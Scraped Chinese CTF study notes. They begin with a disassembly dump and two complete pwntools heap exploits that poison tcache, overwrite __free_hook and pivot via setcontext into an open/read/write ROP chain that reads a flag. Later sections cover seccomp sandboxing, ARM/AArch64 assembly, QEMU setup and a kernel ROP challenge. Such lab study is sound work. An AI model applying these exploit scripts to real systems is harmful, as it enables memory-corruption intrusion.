mov QWORD PTR fs:0x78,rax 0x7ffff7e1a165 : rdsspq rcx 0x7ffff7e1a16a : sub rcx,rdi 0x7ffff7e1a16d : je 0x7ffff7e1a18c 0x7ffff7e1a16f : neg rcx 0x7ffff7e1a172 : shr rcx,0x3 0x7ffff7e1a176 : mov esi,0xff 0x7ffff7e1a17b : cmp rcx,rsi 0x7ffff7e1a17e : cmovb rsi,rcx 0x7ffff7e1a182 : incsspq rsi 0x7ffff7e1a187 : sub rcx,rsi 0x7ffff7e1a18a : ja 0x7ffff7e1a17b 0x7ffff7e1a18c : mov rsi,QWORD PTR [rdx+0x70] 0x7ffff7e1a190 : mov rdi,QWORD PTR [rdx+0x68] 0x7ffff7e1a194 : mov rcx,QWORD PTR [rdx+0x98] 0x7ffff7e1a19b : mov r8,QWORD PTR [rdx+0x28] 0x7ffff7e1a19f : mov r9,QWORD PTR [rdx+0x30] 0x7ffff7e1a1a3 : mov r10,QWORD PTR [rdx+0xa8] 0x7ffff7e1a1aa : mov rdx,QWORD PTR [rdx+0x88] 0x7ffff7e1a1b1 : rdsspq rax 0x7ffff7e1a1b6 : cmp r10,QWORD PTR [rax] 0x7ffff7e1a1b9 : mov eax,0x0 0x7ffff7e1a1be : jne 0x7ffff7e1a1c3 0x7ffff7e1a1c0 : push r10 0x7ffff7e1a1c2 : ret 0x7ffff7e1a1c3 : jmp r10 0x7ffff7e1a1c6 : mov rcx,QWORD PTR [rdx+0xa8] 0x7ffff7e1a1cd : push rcx 0x7ffff7e1a1ce : mov rsi,QWORD PTR [rdx+0x70] 0x7ffff7e1a1d2 : mov rdi,QWORD PTR [rdx+0x68] 0x7ffff7e1a1d6 : mov rcx,QWORD PTR [rdx+0x98] 0x7ffff7e1a1dd : mov r8,QWORD PTR [rdx+0x28] 0x7ffff7e1a1e1 : mov r9,QWORD PTR [rdx+0x30] 0x7ffff7e1a1e5 : mov rdx,QWORD PTR [rdx+0x88] 0x7ffff7e1a1ec : xor eax,eax 0x7ffff7e1a1ee : ret 0x7ffff7e1a1ef : mov rcx,QWORD PTR [rip+0x192c7a] # 0x7ffff7face70 0x7ffff7e1a1f6 : neg eax 0x7ffff7e1a1f8 : mov DWORD PTR fs:[rcx],eax 0x7ffff7e1a1fb : or rax,0xffffffffffffffff 0x7ffff7e1a1ff : ret exp1 rop链在堆地址上 from pwn import* context.log_level = 'debug' p = process('./a.out') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') elf = ELF('./a.out') context.arch = 'amd64' def pr(a,addr): log.success(a+'====>'+hex(addr)) def add(length): p.sendlineafter(':','1') p.sendlineafter('len:',str(length)) def delete(idx): p.sendlineafter(':','2') p.sendlineafter('idx:',str(idx)) def edit(idx,ct): p.sendlineafter(':','3') p.sendlineafter('idx:',str(idx)) p.send(ct) def show(idx): p.sendlineafter(':','4') p.sendlineafter('idx:',str(idx)) add(0x500) #0 add(0x10) #1 delete(0) show(0) leak = u64(p.recv(6)+'\\x00'*2) p.sendlineafter(':','5') p.recvuntil('heap_base:') heapbase = int(p.recvuntil('\\n')[:-1],16)-0x2a0 libcbase = leak - (0x7f6ce9833be0-0x7f6ce9648000) free_hook = libcbase + libc.sym['__free_hook'] pr('libcbase',libcbase) pr('heapbase',heapbase) gadgets = libcbase + 0x154930#mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; setcontext_door = libcbase + libc.sym['setcontext']+61 add(0x10)#2 delete(2) delete(1) edit(1,p64(free_hook)) add(0x10)#3 add(0x10)#4 edit(4,p64(gadgets)) #=============================================== prdi_ret = libcbase+0x0000000000026b72 prsi_ret = libcbase+0x0000000000027529 prdx_r12_ret = libcbase+0x000000000011c371 def ropchain(function,arg1,arg2,arg3): ret = p64(prdi_ret)+p64(arg1) ret += p64(prsi_ret)+p64(arg2) ret += p64(prdx_r12_ret)+p64(arg3)+p64(0) ret += p64(function) return ret read_addr = libcbase + libc.sym['read'] open_addr = libcbase + libc.sym['open'] write_addr = libcbase + libc.sym['write'] rop_addr = heapbase + 0x2c0+0x100 flag_string_addr = rop_addr + 0x200 payload = ropchain(open_addr,flag_string_addr,0,0) payload += ropchain(read_addr,3,flag_string_addr,0x30) payload += ropchain(write_addr,1,flag_string_addr,0x30) payload = payload.ljust(0x200,'\\x00')+'./flag\\x00' #=========================setcontext=========================== frame = SigreturnFrame() frame.rsi=rop_addr frame.rsp=rop_addr frame.rip=libcbase + 0x25679 #ret add(0x400) #5 ct = p64(0)+p64(heapbase+0x2c0) ct = ct.ljust(0x20,'\\x00') + p64(setcontext_door) ct += str(frame).ljust(0x100,'\\x00')[0x28:] ct += payload edit(5,ct) #gdb.attach(p,'b *'+str(gadgets)) pause() delete(5) p.interactive() exp2 rop链放在free_hook附近 from pwn import* context.log_level = 'debug' p = process('./a.out') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') elf = ELF('./a.out') context.arch = 'amd64' def pr(a,addr): log.success(a+'====>'+hex(addr)) def add(length): p.sendlineafter(':','1') p.sendlineafter('len:',str(length)) def delete(idx): p.sendlineafter(':','2') p.sendlineafter('idx:',str(idx)) def edit(idx,ct): p.sendlineafter(':','3') p.sendlineafter('idx:',str(idx)) p.send(ct) def show(idx): p.sendlineafter(':','4') p.sendlineafter('idx:',str(idx)) add(0x500) #0 add(0x10) #1 delete(0) show(0) leak = u64(p.recv(6)+'\\x00'*2) p.sendlineafter(':','5') p.recvuntil('heap_base:') heapbase = int(p.recvuntil('\\n')[:-1],16)-0x2a0 libcbase = leak - (0x7f6ce9833be0-0x7f6ce9648000) free_hook = libcbase + libc.sym['__free_hook'] pr('libcbase',libcbase) pr('heapbase',heapbase) gadgets = libcbase + 0x154930#mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; setcontext_door = libcbase + libc.sym['setcontext']+61 add(0x10)#2 delete(2) delete(1) edit(1,p64(free_hook)) add(0x10)#3 add(0x10)#4 edit(4,p64(gadgets)) #=============================================== prdi_ret = libcbase+0x0000000000026b72 prsi_ret = libcbase+0x0000000000027529 prdx_r12_ret = libcbase+0x000000000011c371 def ropchain(function,arg1,arg2,arg3): ret = p64(prdi_ret)+p64(arg1) ret += p64(prsi_ret)+p64(arg2) ret += p64(prdx_r12_ret)+p64(arg3)+p64(0) ret += p64(function) return ret read_addr = libcbase + libc.sym['read'] open_addr = libcbase + libc.sym['open'] write_addr = libcbase + libc.sym['write'] rop_addr = free_hook & 0xffffffffffffffff flag_string_addr = rop_addr + 0x200 payload = ropchain(open_addr,flag_string_addr,0,0) payload += ropchain(read_addr,3,flag_string_addr,0x30) payload += ropchain(write_addr,1,flag_string_addr,0x30) payload = payload.ljust(0x200,'\\x00')+'./flag\\x00' #=========================setcontext=========================== frame = SigreturnFrame() frame.rax = 0 frame.rdi = 0 frame.rsi=rop_addr frame.rdx = 0x300 frame.rsp=rop_addr frame.rip=libcbase + 0x66229 #syscall;ret; add(0x400) #5 ct = p64(0)+p64(heapbase+0x2c0) ct = ct.ljust(0x20,'\\x00') + p64(setcontext_door) ct += str(frame).ljust(0x100,'\\x00')[0x28:] edit(5,ct) #gdb.attach(p,'b *'+str(gadgets)) delete(5) pause() p.send(payload) p.interactive() "},"pwn/沙箱/seccomp&ptcl/seccomp&ptcl.html":{"url":"pwn/沙箱/seccomp&ptcl/seccomp&ptcl.html","title":"seccomp&ptcl","keywords":"","body":"详细细节看这篇 https://www.anquanke.com/post/id/208364#h2-2 沙箱可以禁用一些系统调用，还是比较常见的感觉。 seccomp 下面这段代码用seccomp沙箱来禁用 安装相应库 sudo apt-get install libseccomp-dev 具体参数啥的就不多讲了。。。看大佬的博客就行。 //gcc -g simple_syscall_seccomp.c -o simple_syscall_seccomp -lseccomp #include #include #include int main(void){ scmp_filter_ctx ctx; ctx = seccomp_init(SCMP_ACT_ALLOW); seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0); //seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(write), 0); seccomp_load(ctx); char * filename = \"/bin/sh\"; char * argv[] = {\"/bin/sh\",NULL}; char * envp[] = {NULL}; write(1,\"i will give you a shell\\n\",24); syscall(59,filename,argv,envp);//execve return 0; } $ ./simple_syscall_seccomp i will give you a shell Bad system call (core dumped) （以下直接搬运了） scmp_filter_ctx是过滤器的结构体 seccomp_init对结构体进行初始化，若参数为SCMP_ACT_ALLOW，则过滤为黑名单模式；若为SCMP_ACT_KILL，则为白名单模式，即没有匹配到规则的系统调用都会杀死进程，默认不允许所有的syscall。 seccomp_rule_add用来添加一条规则，arg_cnt为0,表示我们直接限制execve,不管参数是什么，如果arg_cnt不为0,那arg_cnt表示后面限制的参数的个数,也就是只有调用execve,且参数满足要求时,才会拦截 seccomp_load是应用过滤器,如果不调用seccomp_load则上面所有的过滤都不会生效 注意：编译的时候要在最后面加 -lseccomp 但是这种禁用方式会涉及到堆的操作，会留下堆使用痕迹，出题不用这种，假如栈题倒是可以用。正常用倒是方便，直接调库就行。 prctl 另外一种禁用手段，不会有堆操作，具体原理看大佬文章。。。 示例代码 #include #include #include #include void sandbox(){ struct sock_filter filter[] = { BPF_STMT(BPF_LD+BPF_W+BPF_ABS,4), BPF_JUMP(BPF_JMP+BPF_JEQ,0xc000003e,0,2), BPF_STMT(BPF_LD+BPF_W+BPF_ABS,0), BPF_JUMP(BPF_JMP+BPF_JEQ,59,0,1), BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_KILL), BPF_STMT(BPF_RET+BPF_K,SECCOMP_RET_ALLOW), }; struct sock_fprog prog = { .len = (unsigned short)(sizeof(filter)/sizeof(filter[0])), .filter = filter, }; prctl(PR_SET_NO_NEW_PRIVS,1,0,0,0); prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&prog); } 直接加这个函数就行，这里只禁用了execve。 Seccomp Tools 一个查沙箱禁用规则的工具 安装 sudo apt install gcc ruby-dev sudo gem install seccomp-tools 使用方法seccomp-tools dump ./file "},"arm_pwn/":{"url":"arm_pwn/","title":"arm_pwn","keywords":"","body":""},"arm_pwn/arm&aarch64汇编/arm&aarch64汇编.html":{"url":"arm_pwn/arm&aarch64汇编/arm&aarch64汇编.html","title":"arm&aarch64汇编","keywords":"","body":"arm&aarch64汇编 ARM 架构 ARM架构使用了与Intel/AMD架构所不同的精简指令集(RISC)，因此其函数调用约定以及寄存器也有了一定的差异。 过程调用标准 ARM/ARM64使用的是AAPCS或ATPCS标准。 ATPCS即为ARM-Thumb Procedure Call Standard/ARM-Thumb过程调用标准，规定了一些子程序间调用的基本规则，这些规则包括子程序调用过程中寄存器的使用规则，数据栈的使用规则，参数的传递规则。有了这些规则之后，单独编译的C语言程序就可以和汇编程序相互调用。使用ADS(ARM Developer Suite)的C语言编译器编译的C语言子程序满足用户指定的ATPCS类型。而对于汇编语言来说，则需要用户来保证各个子程序满足ATPCS的要求。而AAPCS即为ARM Archtecture Procedure Call Standard是2007年ARM公司正式推出的新标准，AAPCS是ATPCS的改进版，目前， AAPCS和ATPCS都是可用的标准。 寄存器规则 子程序间通过寄存器R0～R3来传递参数。这时，寄存器R0～R3可记作arg0～arg3。被调用的子程序在返回前无需恢复寄存器R0～R3的内容，R0被用来存储函数调用的返回值。 在子程序中，使用寄存器R4～R11来保存局部变量。这时，寄存器R4～R11可以记作var1～var8。如果在子程序中使用了寄存器v1～v8中的某些寄存器，则子程序进入时必须保存这些寄存器的值，在返回前必须恢复这些寄存器的值。R7经常被用作存储系统调用号，R11存放着帮助我们找到栈帧边界的指针，记作FP。在Thumb程序中，通常只能使用寄存器R4～R7来保存局部变量。 寄存器R12用作过程调用中间临时寄存器，记作IP。在子程序之间的连接代码段中常常有这种使用规则。 寄存器R13用作堆栈指针，记作SP。在子程序中寄存器R13不能用作其他用途。寄存器SP在进入子程序时的值和退出子程序时的值必须相等。 寄存器R14称为连接寄存器，记作LR。它用于保存子程序的返回地址。如果在子程序中保存了返回地址，寄存器R14则可以用作其他用途。 寄存器R15是程序计数器，记作PC。它不能用作其它用途。当执行一个分支指令时，PC存储目的地址。在程序执行中，ARM模式下的PC存储着当前指令加8(两条ARM指令后)的位置，Thumb(v1)模式下的PC存储着当前指令加4(两条Thumb指令后)的位置。 给出ARM架构寄存器与Intel架构寄存器的关系： ARM架构 寄存器名 寄存器描述 Intel架构 寄存器名 R0 通用寄存器 EAX R1~R5 通用寄存器 EBX、ECX、EDX、EDI、ESI R6~R10 通用寄存器 无 R11(FP) 栈帧指针 EBP R12(IP) 内部程序调用 无 R13(SP) 堆栈指针 ESP R14(LP) 链接寄存器 无 R15(PC) 程序计数器 EIP CPSR 程序状态寄存器 EFLAGS 堆栈(Stack)规则 ATPCS规定堆栈为FD类型，即Full Descending，意思是 SP指向最后一个压入的值(栈顶)，数据栈由高地址向低地址生长，即满递减堆栈，并且对堆栈的操作是8字节对齐。所以经常使用的指令就有STMFD和LDMFD。 STMFD指令即Store Multiple FULL Descending指令，相当于压栈。 STMFD SP! ,{R0-R7，LR} 实际上会执行以下命令： SP = SP - 9 x 4 (共计压入R0-R7以及LR一共九个寄存器) ADDRESS = SP MEMORY[ADDRESS] = LR for i = 7 to 0 MEMORY[ADDRESS] = Ri ADDRESS = ADDRESS + 4 此处也可以看出，事实上的入栈顺序与R0-R7，LR相反。 执行SP = SP - 9 x 4后 2.执行ADDRESS = SP后 执行MEMORY[ADDRESS] = LR后 接下来，ADDRESS逐次上移，以此填入寄存器的值 5.至此，入栈指令执行结束。 ⚠️：若入栈指令为STMFD SP ,{R0-R7，LR}，SP指针会在最后回到原位，不会改变SP指针的值。 3.LDMFD指令即Load Multiple FULL Descending指令，相当于出栈，也就是STMFD指令的逆操作。 LDMFD SP! ,{R0-R7，LR} 实际上会执行以下命令： SP = SP + 9 x 4 ADDRESS = SP for i = 0 to 7 Ri = MEMORY[ADDRESS] ADDRESS = ADDRESS - 4 LR = MEMORY[ADDRESS] 4.对于汇编程序来说，如果目标文件中包含了外部调用，则必须满足下列条件： 外部接口的堆栈必须是8字节对齐的。 在汇编程序中使用PRESERVE8伪指令告诉连接器，本汇编程序数据是8字节对齐的。 传参规则 对于参数个数可变的子程序，当参数个数不超过4个时，可以使用寄存器R0～R3来传递参数；当参数超过4个时，还可以使用堆栈来传递参数。 在传递参数时，将所有参数看作是存放在连续的内存字单元的字数据。然后，依次将各字数据传递到寄存器R0，R1，R2和R3中。如果参数多于4个，则将剩余的字数据传递到堆栈中。入栈的顺序与参数传递顺序相反，即最后一个字数据先入栈。 返回值规则 结果为一个32位整数时，可以通过寄存器R0返回 结果为一个64位整数时，可以通过寄存器R0和R1返回 结果为一个浮点数时，可以通过浮点运算部件的寄存器f0、d0或s0来返回 结果为复合型浮点数（如复数）时，可以通过寄存器f0～fn或d0～dn来返回 对于位数更多的结果，需要通过内存来传递。 访址规则 通常，LDR指令被用来从内存中加载数据到寄存器，STR指令被用作将寄存器的值存放到内存中。 @ LDR操作：从R0指向的地址中取值放到R2中 LDR R2, [R0] @ [R0] - 数据源地址来自于R0指向的内存地址 @ STR操作：将R2中的值放到R1指向的地址中 STR R2, [R1] @ [R1] - 目的地址来自于R1在内存中指向的地址 那么我们给出示例代码和解释： .data /* 数据段是在内存中动态创建的，所以它的在内存中的地址不可预测*/ var1: .word 3 /* 内存中的第一个变量且赋值为3 */ var2: .word 4 /* 内存中的第二个变量且赋值为4 */ .text /* 代码段开始 */ .global _start _start: ldr r0, adr_var1 @ 将存放var1值的地址adr_var1加载到寄存器R0中 ldr r1, adr_var2 @ 将存放var2值的地址adr_var2加载到寄存器R1中 ldr r2, [r0] @ 将R0所指向地址中存放的0x3加载到寄存器R2中 str r2, [r1] @ 将R2中的值0x3存放到R1做指向的地址，此时，var2变量的值是0x3 bkpt adr_var1: .word var1 /* var1的地址助记符 */ adr_var2: .word var2 /* var2的地址助记符 */ 接下来我们对这段代码进行反编译，结果如下： ldr r0, [ pc, #12 ] ; 0x8088 ldr r1, [ pc, #12 ] ; 0x808c ldr r2, [r0] str r2, [r1] bx lr 此处，[PC,#12]的意义是PC + 4*3，可以看出，程序使用了偏移寻址的思路，但是，根据我们所写的汇编码： _start: ldr r0, [ pc, #12 ] ; 我们若想获取var_1，应该为PC + 4 * 5才对，但是我们之前提过的，在程序执行中，ARM模式下的PC存储着当前指令加8(两条ARM指令后)的位置，也就是说，此时程序中的状况应该如下表所示： _start: ldr r0, [ pc, #12 ] ldr r1, [ pc, #12 ] ldr r2, [r0] ; 这种形如[Ri , num]的方式被称为立即数作偏移寻址。 str r2, [r1, #2] @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加2所指向地址处。 str r2, [r1, #4]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加4所指向地址处，之后R1寄存器中存储的值加4,也就是R1=R1+4。 ldr r3, [r1], #4 @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中存储的值加4,也就是R1=R1+4。 形如[Ri , Rj]的方式被称为寄存器作偏移寻址。 str r2, [r1, r2] @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处。R1寄存器不会被修改。 str r2, [r1, r2]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加R2寄存器的值所指向地址处，之后R1寄存器中的值被更新,也就是R1=R1+R2。 ldr r3, [r1], r2 @ 取址模式：基于索引后置修改。R3寄存器中的值是从R1寄存器的值所指向的地址中加载的，加载之后R1寄存器中的值被更新也就是R1=R1+R2。 形如[Ri , Rj , ]的方式被称为寄存器缩放值作偏移寻址。 str r2, [r1, r2, LSL#2] @ 取址模式：基于偏移量。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处。R1寄存器不会被修改。 str r2, [r1, r2, LSL#2]! @ 取址模式：基于索引前置修改。R2寄存器中的值0x3被存放到R1寄存器的值加(左移两位后的R2寄存器的值)所指向地址处，之后R1寄存器中的值被更新,也就R1 = R1 + R2 AArch64 架构 需要指出的是，AArch64架构并不是ARM-32架构的简单扩展，他是在ARMv8引入的一种全新架构。 寄存器变化 AArch拥有31个通用寄存器，系统运行在64位状态下的时候名字叫Xn，运行在32位的时候就叫Wn。 寄存器 别名 意义 SP – Stack Pointer:栈指针 R30 LR Link Register:在调用函数时候，保存下一条要执行指令的地址。 R29 FP Frame Pointer:保存函数栈的基地址。 R19-R28 – Callee-saved registers（含义见上面术语解释） R18 – 平台寄存器，有特定平台解释其用法。 R17 IP1 The second intra-procedure-call temporary register…… R16 IP0 The first intra-procedure-call temporary register…… R9-R15 – 临时寄存器 R8 – 在一些情况下，返回值是通过R8返回的 R0-R7 – 在函数调用过程中传递参数和返回值 NZCV – 状态寄存器：N（Negative）负数 Z(Zero) 零 C(Carry) 进位 V(Overflow) 溢出 指令集变化 除了批量加载寄存器指令 LDM/STM, PUSH/POP, 使用STP/LDP 一对加载寄存器指令代替。 没有提供访问CPSR的单一寄存器，但是提供访问PSTATE的状态域寄存器。 A64没有协处理器的概念，没有协处理器指令MCR,MRC。 相比A32少了很多条件执行指令，只有条件跳转和少数数据处理这类指令才有条件执行。 指令基本格式 {} , {,} Opcode：操作码，也就是助记符，说明指令需要执行的操作类型。 Cond：指令执行条件码。 S：条件码设置项,决定本次指令执行是否影响PSTATE寄存器响应状态位值。 Rd/Xt：目标寄存器，A32指令可以选择R0-R14,T32指令大部分只能选择RO-R7，A64指令可以选择X0-X30。 Rn/Xn：第一个操作数的寄存器，和Rd一样，不同指令有不同要求。 Opcode2：第二个操作数，可以是立即数，寄存器Rm和寄存器移位方式（Rm，#shit）。 内存操作指令-load/store 在分析AArch64架构程序时，会发现我们找不到ARM中常见的STMFD/LDMFD命令，取而代之的是STP/LDP命令。 在ARM-v8指令集中，程序支持以下五种寻址方式： Base register only (no offset) ：基址寄存器无偏移。形如:[ base { , #0 } ]。 Base plus offset：基址寄存器加偏移。形如:[ base { , #imm } ]。 Pre-indexed：事先更新寻址，先变化后操作。形如:[ base , #imm ]!。⚠️：!符号表示则当数据传送完毕之后，将最后的地址写入基址寄存器，否则基址寄存器的内容不改变。 Post-indexed：事后更新寻址，先操作后变化。形如:[ base ] , #imm。 Literal (PC-relative): PC相对寻址。 常见的Load/Store指令有： LDR，LDRB，LDRSB，LDRH，LDRSW，STR，STRB，STRH ⚠️：此处R – Register(寄存器)、RB – Byte(字节-8bit)、SB – Signed Byte(有符号字节)、RH – Half Word(半字-16bit)、SW- Signed Word(带符号字-32bit)。 举例： LDR X1 , [X2]——将X2寄存器中的值赋给X1寄存器。 LDR X1 , [X2] ， #4——将X2寄存器中的值赋给X1寄存器，然后X2寄存器中的值加4。 对于Load Pair/Store Pair这两个指令：从Memory地址addr处读取两个双字/字数据到目标寄存器Xt1，Xt2。 参考文章: https://www.anquanke.com/post/id/199112#h3-13 "},"arm_pwn/ARMpwn基础环境搭建/ARMpwn基础环境搭建.html":{"url":"arm_pwn/ARMpwn基础环境搭建/ARMpwn基础环境搭建.html","title":"ARMpwn基础环境搭建","keywords":"","body":"ARMpwn基础环境搭建 QEMU 选择源码安装 官网下载https://www.qemu.org/ 先安装一些依赖 $ sudo apt-get install ninja-build $ sudo apt-get install build-essential zlib1g-dev pkg-config libglib2.0-dev $ sudo apt-get install libmount-dev $ sudo apt-get install libpixman-1-dev 解压，编译安装 $ tar xvJF qemu-6.0.0.tar.xz #文件夹改个名字 $ mv qemu-6.0.0 qemu #创建一个临时文件夹 $ mkdir build $ cd build $ ../qemu/configure $ make; make install 验证 pwn20tty@ubuntu:~/Desktop/ctf-tools$ qemu-riscv64 --version qemu-riscv64 version 6.0.0 Copyright (c) 2003-2021 Fabrice Bellard and the QEMU Project developers 交叉编译工具 # 下载资源 $ wget http://releases.linaro.org/components/toolchain/binaries/6.3-2017.05/aarch64-linux-gnu/gcc-linaro-6.3.1-2017.05-x86_64_aarch64-linux-gnu.tar.xz # 解压 $ tar -xvf gcc-linaro-6.3.1-2017.05-x86_64_aarch64-linux-gnu.tar.xz 写入环境变量 $ gedit ~/.bashrc 在最后一行加上信息 路径为~/gcc-linaro-6.3.1-2017.05-x86_64_aarch64-linux-gnu/bin 环境变量生效 $ source ~/.bashrc 编译运行一个arm程序 a.c #include int main(){ printf(\"hello world!\\n\"); return 0; } 编译 (可以加上-static参数进行静态编译) $ aarch64-linux-gnu-gcc -o out a.c 假如是动态链接，则需要将运行库文件夹拷贝到当前目录（也可以直接加上-L参数指定动态链接库文件夹） 注：交叉编译工具里有动态运行库文件夹 $ cp -r ~/Desktop/ctf-tools/gcc-linaro-6.3.1-2017.05-x86_64_aarch64-linux-gnu/aarch64-linux-gnu/libc/lib ./ 运行 $ qemu-aarch64 -L . ./out 或者直接-L参数写上lib路径，这样就不用拷贝，不过调试的时候需要手动加载了，要不然符号信息可能不能加载。 $ qemu-aarch64 -L /home/pwn20tty/Desktop/ctf-tools/gcc-linaro-6.3.1-2017.05-x86_64_aarch64-linux-gnu/aarch64-linux-gnu/libc ./out 调试arm程序 安装能够调试多架构的gdb $ sudo apt-get install gdb-multiarch 先启动程序开启监听 $ qemu-aarch64 -L . -g 1234 out 调试 $ gdb-multiarch out pwndbg> target remote :1234 之后调试就和正常x86/x64一样啦，并且符号表信息成功加载 "},"arm_pwn/树莓派搭建ARM环境/树莓派搭建ARM环境.html":{"url":"arm_pwn/树莓派搭建ARM环境/树莓派搭建ARM环境.html","title":"树莓派搭建ARM环境","keywords":"","body":"树莓派搭建ARM64位环境 换源（很重要！！！） 64位镜像可以直接使用debian的系统源，首先需要编辑/etc/apt/sources.list，使用#号注释原内容，然后在末尾添加Debian的系统源： # 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释 deb https://mirrors.tuna.tsinghua.edu.cn/debian/ buster main contrib non-free # deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ buster main contrib non-free deb https://mirrors.tuna.tsinghua.edu.cn/debian/ buster-updates main contrib non-free # deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ buster-updates main contrib non-free deb https://mirrors.tuna.tsinghua.edu.cn/debian/ buster-backports main contrib non-free # deb-src https://mirrors.tuna.tsinghua.edu.cn/debian/ buster-backports main contrib non-free deb https://mirrors.tuna.tsinghua.edu.cn/debian-security buster/updates main contrib non-free # deb-src https://mirrors.tuna.tsinghua.edu.cn/debian-security buster/updates main contrib non-free 接着需要配置树莓派官方的软件源，编辑/etc/apt/sources.list.d/raspi.list，同样的，注释原内容，在末尾添加如下内容： deb http://mirrors.tuna.tsinghua.edu.cn/raspberrypi/ buster main ui lrzsz 为了xshell传文件方便 $ sudo apt install lrzsz pwntools python2安装pwntools $ apt-get update $ apt-get install -y python-pip build-essential python-dev python-setuptools libffi-dev libssl-dev $ python -m pip install --upgrade pip $ pip install -U setuptools $ pip install more-itertools==5.0.0 $ pip install pwntools 装一半失败了。。。选择从github上去下 $ git clone https://github.com/Gallopsled/pwntools.git $ cd pwntools $ python setup.py install python3安装pwntools $ apt-get update $ apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential $ python3 -m pip install --upgrade pip $ python3 -m pip install --upgrade pwntools Binutils 这个工具主要是为了各个架构的汇编，要不然pwntools里的asm模块不能够正常使用 假如是ubuntu装起来很容易，但是别的系统装起来就很麻烦 这里选择去github上找 先安装texinfo，要不然编译会出错 $ apt install texinfo $ git clone https://github.com/Gallopsled/pwntools-binutils $ cd pwntools-binutils/generic $ chmod +x install.sh $ chmod +x install_all.sh 可以直接选择运行install_all.sh，不过不建议，全架构太慢了。 可以./install.sh architecture来安装相应的架构 支持的架构 aarch64 alpha arm avr cris hppa ia64 m68k mips mips64 msp430 powerpc powerpc64 s390 sparc vax xscale i386 x86_64 pwndbg 好像没有什么坑，比较顺利 $ git clone https://github.com/pwndbg/pwndbg $ cd pwndbg $ ./setup.sh 安装谷歌输入法 $ sudo apt-get install fcitx fcitx-googlepinyin fcitx-module-cloudpinyin fcitx-sunpinyin 重启后在配置里添加中文键盘 ctrl+空格切换输入法 然后就可以快乐中文输入啦 "},"kernel_pwn/":{"url":"kernel_pwn/","title":"kernel_pwn","keywords":"","body":""},"kernel_pwn/c文件操作/c文件操作.html":{"url":"kernel_pwn/c文件操作/c文件操作.html","title":"c文件操作","keywords":"","body":"https://fishc.com.cn/forum.php?mod=viewthread&tid=66397&extra=page%3D1%26filter%3Dtypeid%26typeid%3D583 "},"kernel_pwn/kernel_pwn_rop/kernel_pwn_rop.html":{"url":"kernel_pwn/kernel_pwn_rop/kernel_pwn_rop.html","title":"kernel_pwn_rop","keywords":"","body":"环境搭建&工具 qemu qemu 是一款由 Fabrice Bellard等人编写的可以执行硬件虚拟化的开源托管虚拟机，具有运行速度快（配合 kvm），跨平台等优点。 gdb&pwndbg ropper extract-vmlinux & vmlinux-to-elf（我还不会用。。尝试了几次符号表加载进gdb的时候失败了，不过影响也不大，感觉前期不用也没事） https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux https://github.com/marin-m/vmlinux-to-elf 题目附件形式 boot.sh: 一个用于启动 kernel 的 shell 的脚本，多用 qemu，保护措施与 qemu 不同的启动参数有关 bzImage: kernel binary rootfs.cpio: 文件系统映像(图形界面下可以直接解压。。) 题目：kernel ROP - 2018 强网杯 - core 对于文件系统由于运行qemu时还要打包，所以通常写个压缩的脚本，放在文件系统根目录下。 pack.sh #!/bin/sh find . | cpio -o --format=newc > ../core.cpio 文件系统下的init初始化脚本 #!/bin/sh mount -t proc proc /proc mount -t sysfs sysfs /sys mount -t devtmpfs none /dev /sbin/mdev -s mkdir -p /dev/pts mount -vt devpts -o gid=4,mode=620 none /dev/pts chmod 666 /dev/ptmx cat /proc/kallsyms > /tmp/kallsyms echo 1 > /proc/sys/kernel/kptr_restrict echo 1 > /proc/sys/kernel/dmesg_restrict ifconfig eth0 up udhcpc -i eth0 ifconfig eth0 10.0.2.15 netmask 255.255.255.0 route add default gw 10.0.2.2 insmod /core.ko poweroff -d 1200000 -f & setsid /bin/cttyhack setuidgid 1000 /bin/sh echo 'sh end!\\n' umount /proc umount /sys poweroff -d 0 -f 相对重要的几行 1. cat /proc/kallsyms > /tmp/kallsyms 在普通用户下也可以通过/tmp/kallsyms来查看内核的函数模块，可以泄露内核加载基地址 cat /tmp/kallsyms | grep startup_64 2. insmod /core.ko 加载驱动命令，也就是存在漏洞的驱动 在root权限下lsmod可以查看驱动加载基地址 3. setsid /bin/cttyhack setuidgid 1000 /bin/sh 设置用户，在调试过程中通常直接setuid为0，方便查看一些基地址 启动环境前看看启动脚本 boot.sh qemu-system-x86_64 \\ -m 256M \\ -kernel ./bzImage \\ -initrd ./core.cpio \\ -append \"root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr useradd\" \\ -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \\ -nographic \\ -gdb tcp::1234\\ 通常会注意一下-append的内容，查看保护情况，这道题没开smep 题目分析 详细的过程还是看wiki吧...我写的太烂了 https://ctf-wiki.org/pwn/linux/kernel/kernel_rop/ 大致思路就是通过 core_read()函数来泄露内存中的敏感信息（canary，驱动加载基地址，vmlinux加载基地址）（这里vmlinux_base也可以通过打开/tmp/kallsyms来直接读取），然后通过 core_write() 和 core_copy_func() 来实现一个栈溢出。 给出最终exp之前先给几个常用的方法。 当从内核态回到用户态时流程如下： 通过 swapgs 恢复 GS 值 通过 sysretq 或者 iretq 恢复到用户控件继续执行。如果使用 iretq 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等） 所以我们需要记录在用户态下的状态，通常用一段汇编代码实现 unsigned long user_cs, user_ss, 